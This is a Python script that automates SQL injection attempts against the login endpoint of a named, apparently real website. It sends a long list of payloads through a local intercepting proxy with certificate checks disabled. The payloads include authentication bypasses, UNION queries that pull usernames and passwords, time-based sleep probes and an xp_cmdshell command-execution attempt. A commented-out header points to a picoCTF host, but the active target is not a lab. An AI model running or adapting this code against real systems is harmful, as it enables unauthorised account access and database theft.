import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080',
}

url="https://zamider.com/login"


payloads = [
    "ad'||'min"
    "ad'||'min';",
    "sobatista'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "' OR 'a'='a'--",
    "' OR 'a'='a'#",
    "' OR ''='",
    "' OR 1=1--+",
    "' OR 1=1;--",
    "' OR TRUE--",
    "' OR TRUE#",
    "\" OR 1=1--",
    "\" OR 1=1#",
    "\" OR \"a\"=\"a",
    "\" OR \"\"=\"",
    "\" OR TRUE--",
    "admin'--",
    "admin'#",
    "admin'/*",
    "admin\"--",
    "admin\"#",
    "admin' OR 1=1--",
    "admin' OR 1=1#",
    "admin' OR '1'='1'--",
    "admin\" OR 1=1--",
    "admin') OR 1=1--",
    "admin\") OR 1=1--",
    "') OR 1=1--",
    "') OR ('1'='1'--",
    "\") OR 1=1--",
    "')) OR 1=1--",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1 LIMIT 1#",
    "' OR 1=1 ORDER BY 1--",
    "' UNION SELECT 1,'admin','password'--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT 'admin','admin'--",
    "' UNION SELECT username,password FROM users--",
    "1' OR 1=1--",
    "1' OR '1'='1'--",
    "1' OR 1=1#",
    "1\" OR 1=1--",
    "' OR 1=1--+- ",
    "' OR 1=1;%00",
    "' OR 1=1 %00",
    "admin' OR 1=1 LIMIT 1--+",
    "' OR 1=1 UNION ALL SELECT 1,2,3--",
    "'/**/OR/**/1=1--",
    "'/**/OR/**/'1'='1'--",
    "admin'/**/--",
    "' OR/**/ 1=1--",
    "' /*!50000OR*/ 1=1--",
    "' %6FR 1=1--",
    "' %4FR 1=1--",
    "' oR 1=1--",
    "' Or 1=1--",
    "' || 1=1--",
    "' || '1'='1'--",
    "' && 1=1--",
    "' | 1=1--",
    "' OR 1 LIKE 1--",
    "' OR 2 BETWEEN 1 AND 3--",
    "' OR 1 IN (1)--",
    "' OR 1=1-- -",
    "' OR 1=1;-- -",
    "'-'",
    "' '",
    "'&'",
    "'^'",
    "'*'",
    "'-0-'",
    "' + 0 + '",
    "' + '",
    "admin' AND 1=1--",
    "' OR NOT 0=0--",
    "' OR NOT FALSE--",
    "' OR 2>1--",
    "' OR 'x'='x'--",
    "' OR ISNULL(NULL)--",
    "' OR LEN('a')=1--",
    "' OR 1=1#-- -",
    "'; EXEC xp_cmdshell('whoami')--",
    "' OR SLEEP(5)--",
    "' OR BENCHMARK(10000000,SHA1('a'))--",
    "' OR pg_sleep(5)--",
    "' OR WAITFOR DELAY '0:0:5'--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "' OR (SELECT 1)=1--",
    "' OR (SELECT COUNT(*) FROM users)>0--",
    "' OR EXISTS(SELECT 1)--",
    "' OR 1=1::int--",
    "\\",
    "' OR username IS NOT NULL--",
    "' HAVING 1=1--",
    "' GROUP BY password HAVING 1=1--",
    "' OR 1=1 %23",
    "' OR 0x50=0x50--",
    "' OR CHAR(49)=CHAR(49)--",
    "' OR 0b1=0b1--",
    "anything' OR 'x'='x",
    "x' OR 1=1 OR 'x'='y",
    "' OR 1 --",
    "or 1=1",
    "or 1=1--",
    "' or 1=1 or ''='",
    "\" or 1=1 or \"\"=\"",
    "' OR 'bug",
    "' OR 1=1 AND ''='",
    "admin' #",
    "admin')--",
    "') OR TRUE--",
    "') OR ('x')=('x",
    "' OR MID(1,1,1)='1'--",
    "' OR ASCII(SUBSTRING('a',1,1))=97--",
]

# headers = {
#     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
#     "Referer": "http://shape-facility.picoctf.net:53633/index.php",
#     "Origin": "http://shape-facility.picoctf.net:53633",
#     "Content-Type": "application/x-www-form-urlencoded"
# }
headers = {
    "Host": "admin.zamider.com",
    "Content-Length": "108",
    "Sec-Ch-Ua-Platform": '"macOS"',
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "application/json",
    "Sec-Ch-Ua": '"Not-A.Brand";v="24", "Chromium";v="146"',
    "Content-Type": "application/json",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Origin": "https://zamider.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://zamider.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i"
}





# cookies = {
#     "PHPSESSID": "d4693bbc8771c53ca7f63b2186eaa55b"
# }



for payload in payloads:
    data = {
    "login": f"{payload}",
    "password": "aaaaaa",
    "session_id": "anon-TW96aWxsYS81LjAg-nrtbnfh",
    "email": "aa",
    "username": "aa"
}
    # params={
    #     'user':f'{payload}',
    #     'pass':'admin'
    # }
    r=requests.post(url,json=data,headers=headers,verify=False,proxies=proxies)
    print(f"Status Code: {r.status_code}")
    if "Invalid" not in r.text:
        print(f"\n\nResponse : {r.text}")
    else:
        print("Invalid")
    break
    



